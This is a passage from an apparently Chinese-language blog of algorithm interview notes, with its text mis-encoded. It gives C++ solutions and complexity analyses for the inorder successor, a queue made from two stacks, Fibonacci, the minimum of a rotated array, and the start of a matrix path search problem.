alt="image-20221214121311915"></p><p><strong>æ—¶é—´å¤æ‚åº¦</strong><br>ä¸è®ºå¾€ä¸Šæ‰¾è¿˜æ˜¯å¾€ä¸‹æ‰¾ï¼Œæ€»å…±éå†çš„èŠ‚ç‚¹æ•°éƒ½ä¸å¤§äºæ ‘çš„é«˜åº¦ã€‚æ‰€ä»¥æ—¶é—´å¤æ‚åº¦æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(h)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span>ï¼Œå…¶ä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span> æ˜¯æ ‘çš„é«˜åº¦ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode *father;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL), father(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">TreeNode* <span class="title">inorderSuccessor</span><span class="params">(TreeNode* p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;right) &#123;</span><br><span class="line">      p = p-&gt;right;</span><br><span class="line">      <span class="keyword">while</span> (p-&gt;left) p = p-&gt;left;</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;father &amp;&amp; p == p-&gt;father-&gt;right) p = p-&gt;father;</span><br><span class="line">    <span class="keyword">return</span> p-&gt;father;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—"><a href="https://www.acwing.com/problem/content/36/">ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—</a></h2><p>è¯·ç”¨æ ˆå®ç°ä¸€ä¸ªé˜Ÿåˆ—ï¼Œæ”¯æŒå¦‚ä¸‹å››ç§æ“ä½œï¼š</p><ul><li>push(x) â€“ å°†å…ƒç´ xæ’åˆ°é˜Ÿå°¾ï¼›</li><li>pop() â€“ å°†é˜Ÿé¦–çš„å…ƒç´ å¼¹å‡ºï¼Œå¹¶è¿”å›è¯¥å…ƒç´ ï¼›</li><li>peek() â€“ è¿”å›é˜Ÿé¦–å…ƒç´ ï¼›</li><li>empty() â€“ è¿”å›é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼›</li></ul><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>ä½ åªèƒ½ä½¿ç”¨æ ˆçš„æ ‡å‡†æ“ä½œï¼š<code>push to top</code>ï¼Œ<code>peek/pop from top</code>, <code>size</code> å’Œ <code>is empty</code>ï¼›</li><li>å¦‚æœä½ é€‰æ‹©çš„ç¼–ç¨‹è¯­è¨€æ²¡æœ‰æ ˆçš„æ ‡å‡†åº“ï¼Œä½ å¯ä»¥ä½¿ç”¨listæˆ–è€…dequeç­‰æ¨¡æ‹Ÿæ ˆçš„æ“ä½œï¼›</li><li>è¾“å…¥æ•°æ®ä¿è¯åˆæ³•ï¼Œä¾‹å¦‚ï¼Œåœ¨é˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼Œä¸ä¼šè¿›è¡Œ<code>pop</code>æˆ–è€…<code>peek</code>ç­‰æ“ä½œï¼›</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ¯ç»„æ•°æ®æ“ä½œå‘½ä»¤æ•°é‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>100</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,100]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">100</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>MyQueue queue = new MyQueue();queue.push(1);queue.push(2);queue.peek();  // returns 1queue.pop();   // returns 1queue.empty(); // returns false</code></pre><h3 id="è§£æ³•">è§£æ³•</h3><blockquote><p>æ ˆæ˜¯â€œå…ˆè¿›åå‡ºï¼Œåè¿›å…ˆå‡ºâ€ï¼Œä¸¤å¥è¯è”ç³»åœ¨ä¸€èµ·å¾ˆè‡ªç„¶å¯ä»¥å¾—å‡ºï¼šä¸¤ä¸ªæ ˆå¯ä»¥å®ç°â€œå…ˆè¿›å…ˆå‡ºâ€ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  stack&lt;<span class="type">int</span>&gt; stk, cache;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">copy</span><span class="params">(stack&lt;<span class="type">int</span>&gt; &amp;source, stack&lt;<span class="type">int</span>&gt; &amp;dest)</span> </span>&#123;  <span class="comment">// &amp;, å¦åˆ™æŠ¥Segmentation Fault</span></span><br><span class="line">    <span class="keyword">while</span> (source.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      dest.<span class="built_in">push</span>(source.<span class="built_in">top</span>());</span><br><span class="line">      source.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">  <span class="built_in">MyQueue</span>() &#123;</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    stk.<span class="built_in">push</span>(x);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">copy</span>(stk, cache);</span><br><span class="line">    <span class="type">int</span> res = cache.<span class="built_in">top</span>();</span><br><span class="line">    cache.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="built_in">copy</span>(cache, stk);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Get the front element. */</span></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">copy</span>(stk, cache);</span><br><span class="line">    <span class="type">int</span> res = cache.<span class="built_in">top</span>();</span><br><span class="line">    <span class="built_in">copy</span>(cache, stk);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> stk.<span class="built_in">empty</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue obj = MyQueue();</span></span><br><span class="line"><span class="comment"> * obj.push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj.peek();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj.empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="æ–æ³¢é‚£å¥‘æ•°åˆ—"><a href="https://www.acwing.com/problem/content/19/">æ–æ³¢é‚£å¥‘æ•°åˆ—</a></h2><p>è¾“å…¥ä¸€ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ï¼Œæ±‚æ–æ³¢é‚£å¥‘æ•°åˆ—çš„ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> é¡¹ã€‚</p><p>å‡å®šä» <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> å¼€å§‹ï¼Œç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> é¡¹ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>39</mn></mrow><annotation encoding="application/x-tex">0 \le n \le 39</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">39</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥æ•´æ•° n=5 è¿”å› 5</code></pre><h3 id="é¢˜è§£-O-n">é¢˜è§£ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">Fibonacci</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>, b = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (n -- ) &#123;</span><br><span class="line">      <span class="type">int</span> c = a + b;</span><br><span class="line">      a = b, b = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—â˜…"><a href="https://www.acwing.com/problem/content/20/">æ—‹è½¬æ•°ç»„çš„æœ€å°æ•°å­—â˜…</a></h2><p>æŠŠä¸€ä¸ªæ•°ç»„æœ€å¼€å§‹çš„è‹¥å¹²ä¸ªå…ƒç´ æ¬åˆ°æ•°ç»„çš„æœ«å°¾ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæ•°ç»„çš„æ—‹è½¬ã€‚</p><p>è¾“å…¥ä¸€ä¸ªå‡åºçš„æ•°ç»„çš„ä¸€ä¸ªæ—‹è½¬ï¼Œè¾“å‡ºæ—‹è½¬æ•°ç»„çš„æœ€å°å…ƒç´ ã€‚</p><p>ä¾‹å¦‚æ•°ç»„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{3,4,5,1,2\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mclose">}</span></span></span></span> ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{1,2,3,4,5\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mclose">}</span></span></span></span> çš„ä¸€ä¸ªæ—‹è½¬ï¼Œè¯¥æ•°ç»„çš„æœ€å°å€¼ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ã€‚</p><p>æ•°ç»„å¯èƒ½åŒ…å«é‡å¤é¡¹ã€‚</p><p><strong>æ³¨æ„</strong>ï¼šæ•°ç»„å†…æ‰€å«å…ƒç´ éè´Ÿï¼Œè‹¥æ•°ç»„å¤§å°ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼Œè¯·è¿”å› <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">âˆ’</span><span class="mord">1</span></span></span></span>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>90</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,90]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">90</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼šnums = [2, 2, 2, 0, 1]è¾“å‡ºï¼š0</code></pre><h3 id="é¢„å¤„ç†-äºŒåˆ†-O-n">é¢„å¤„ç† + äºŒåˆ† <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><p><strong>æ€è·¯</strong></p><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221214162729829.png" alt="image-20221214162729829"></p><p>äºŒåˆ†æœ¬è´¨: ä¸€åŠåŒºé—´æ»¡è¶³æŸç§æ€§è´¨, è€Œå¦ä¸€åŠåŒºé—´å…¨éƒ¨ä¸æ»¡è¶³, è¿™é¢˜ä¸èƒ½ç›´æ¥ä½¿ç”¨äºŒåˆ†<br>ç”±äºé‡å¤å…ƒç´ çš„å­˜åœ¨, å·¦è¾¹æ‰€æœ‰å…ƒç´ éƒ½&gt;=nums[0], è€Œå³è¾¹å¹¶éæ‰€æœ‰å…ƒç´ éƒ½ä¸æ»¡è¶³(å¹¶ä¸å…¨ä¸¥æ ¼&lt;nums[0)ï¼šæœ«å°¾é‡å¤å…ƒç´ æ»¡è¶³&gt;=nums[0]<br>å»æ‰å³é‡å, å·¦è¾¹ä¸¥æ ¼&gt;=nums[0], å³è¾¹ä¸¥æ ¼&lt;nums[0], å¯ç”¨äºŒåˆ†ã€‚</p><p><strong>æ—¶é—´å¤æ‚åº¦</strong><br>äºŒåˆ†çš„æ—¶é—´å¤æ‚åº¦æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ï¼Œåˆ é™¤æœ€åæ°´å¹³ä¸€æ®µçš„æ—¶é—´å¤æ‚åº¦æœ€åæ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ï¼Œæ‰€ä»¥æ€»æ—¶é—´å¤æ‚åº¦æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">findMin</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (r &gt; <span class="number">0</span> &amp;&amp; nums[r] == nums[<span class="number">0</span>]) r--;</span><br><span class="line">    <span class="keyword">if</span> (nums[r] &gt; nums[<span class="number">0</span>]) <span class="keyword">return</span> nums[<span class="number">0</span>];  <span class="comment">// åˆ¤æ–­æ˜¯å¦å•è°ƒ</span></span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">      <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (nums[mid] &lt; nums[<span class="number">0</span>]) &#123;  <span class="comment">// &lt;nums[0]ï¼Œè€Œénums[mid]</span></span><br><span class="line">        r = mid;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        l = mid + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[l];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="çŸ©é˜µä¸­çš„è·¯å¾„â˜…"><a href="https://www.acwing.com/problem/content/21/">çŸ©é˜µä¸­çš„è·¯å¾„â˜…</a></h2><p>è¯·è®¾è®¡ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥åˆ¤æ–­åœ¨ä¸€ä¸ªçŸ©é˜µä¸­æ˜¯å¦å­˜åœ¨ä¸€æ¡åŒ…å«æŸå­—ç¬¦ä¸²æ‰€æœ‰å­—ç¬¦çš„è·¯å¾„ã€‚</p><p>è·¯å¾„å¯ä»¥ä»çŸ©é˜µä¸­çš„ä»»æ„ä¸€ä¸ªæ ¼å­å¼€å§‹ï¼Œæ¯ä¸€æ­¥å¯ä»¥åœ¨çŸ©é˜µä¸­å‘å·¦ï¼Œå‘å³ï¼Œå‘ä¸Šï¼Œå‘ä¸‹ç§»åŠ¨ä¸€ä¸ªæ ¼å­ã€‚</p><p>å¦‚æœä¸€æ¡è·¯å¾„ç»è¿‡äº†çŸ©é˜µä¸­çš„æŸä¸€ä¸ªæ ¼å­ï¼Œåˆ™ä¹‹åä¸èƒ½å†æ¬¡è¿›å…¥è¿™ä¸ªæ ¼å­ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>è¾“å…¥çš„è·¯å¾„ä¸ä¸ºç©ºï¼›</li><li>æ‰€æœ‰å‡ºç°çš„å­—ç¬¦å‡ä¸ºå¤§å†™è‹±æ–‡å­—æ¯ï¼›</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>çŸ©é˜µä¸­å…ƒç´ çš„æ€»ä¸ªæ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>900</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,900]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">900</span><span class="mclose">]</span></span></span></span>ã€‚<br>è·¯å¾„å­—ç¬¦ä¸²çš„æ€»é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>900</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,900]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">900</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>matrix=[  [&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;E&quot;],  [&quot;S&quot;,&quot;F&quot;,&quot;C&quot;,&quot;S&quot;],  [&quot;A&quot;,&quot;D&quot;,&quot;E&quot;,&quot;E&quot;]]str=&quot;BCCE&quot; , return &quot;true&quot; str=&quot;ASAE&quot; , return &quot;false&quot;</code></pre><h3 id="DFSå¤§æ³•å¥½-O-n-23-k">DFSå¤§æ³•å¥½ <span class="katex"><span class="katex-mathml"><math 